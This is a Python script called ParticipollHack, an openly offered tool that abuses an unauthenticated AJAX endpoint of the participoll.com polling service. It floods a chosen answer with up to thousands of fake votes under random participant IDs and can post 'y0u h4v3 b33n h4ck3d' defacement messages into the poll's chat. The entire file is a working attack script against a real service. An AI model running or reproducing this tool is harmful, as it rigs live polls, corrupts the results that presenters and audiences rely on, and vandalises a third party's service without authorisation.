#!/usr/bin/env python3
import requests
import argparse
from random import randint


class ParticipollHack:
    def __init__(self, userID = 2453, baseURL = "http://participoll.com"):
        self.userID = userID
        self.baseURL = baseURL
        self.postVote = "/wp-content/themes/participoll/alternativeCall.php?action=run_ajax&fn=log_response&userID={0}&participantID={1}&response={2}"
        self.postComment = "/wp-content/themes/participoll/alternativeCall.php?action=run_ajax&fn=log_comment&userID={0}&comment={1}"

    def send_vote(self, vote ="A", count = 1000, verbos=False):
        if vote is not "A" and \
         vote is not "B" and \
         vote is not "C" and \
         vote is not "D" and \
         vote is not "E" and \
         vote is not "F":
            print("Error: vote has to be an uppercase letter between A and F")
            return

        for i in range(count):
            participantID = randint(1, 100000)
            postURL = self.baseURL + self.postVote.format(self.userID, participantID, vote)
            r = requests.post(postURL)
            if r.status_code != 200:
                print("Error while sending vote :/")
                break
            if verbos:
                print("...sent vote {}.time".format(i+1))
        print("successfully sent vote [{}] {} times".format(vote, count))

    def send_comment(self, comment="foo ba", count=1):
        for i in range(count):
            postURL = self.baseURL + self.postComment.format(self.userID, comment)
            r = requests.post(postURL)
            if r.status_code != 200:
                print("Error while sending comment :/")
            print("successfully sent comment: {}".format(comment))

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("vote", type=str, help="the vote [A,B,C,D,E,F]")
    parser.add_argument("-n", type=int, help="number of responses to send")
    parser.add_argument("-v", help="activate verbose mode", action="store_true")
    parser.add_argument("-p", help="post poser-comment in chat", action="store_true")
    parser.add_argument("-u", type=int, help="userID of the participoll.com user, by default it is set to dbs.participoll.com [2453]")

    args = parser.parse_args()
    print("Welcome to ParticipollHack")
    print("published under CC BY-NC-SA 3.0 in 2016")

    if args.u:
        part = ParticipollHack(userID=args.u)
    else:
        part = ParticipollHack()

    if not args.n:
        print("Vote [{}] will be sent 100 times to participoll".format(args.vote))
        part.send_vote(vote=args.vote, verbos=bool(args.v))
    else:
        print("Vote [{}] will be sent {} times to participoll".format(args.vote, args.n))
        part.send_vote(vote=args.vote, count=args.n, verbos=bool(args.v))

    if args.p:
        part.send_comment(comment="~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        part.send_comment(comment="y0u h4v3 b33n h4ck3d")
        part.send_comment(comment="the code was published at www.github.com/shiaky/participollhack/")
        part.send_comment(comment="stay tuned")
        part.send_comment(comment="~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")